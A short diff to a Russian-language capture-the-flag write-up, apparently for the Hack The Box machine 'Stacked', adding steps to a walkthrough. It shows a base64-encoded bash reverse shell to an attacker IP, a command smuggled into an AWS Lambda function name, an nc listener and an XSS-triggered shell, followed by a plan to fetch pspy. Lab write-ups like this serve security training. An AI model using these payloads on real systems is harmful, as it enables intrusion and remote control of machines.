@@ -225,3 +225,14 @@ $ echo -n "bash -i >& /dev/tcp/10.10.16.93/9898 0>&1" | base64
 $ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function-name 'func1;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45My85ODk4IDA+JjE=|base64 -d|bash' --role user --handler index.handler --runtime nodejs10.x --zip-file fileb://index.zip
 ```
 
+Теперь ставим листенер:
+
+```
+$ nc -nlvp 9898
+```
+
+Снова через BurpSuite отправляем запрос с XSS на редирект на localhost:8080. Получаем шелл:
+
+![](../.gitbook/assets/16.png)
+
+Теперь нам нужно прокинуть pspy на нашу машину
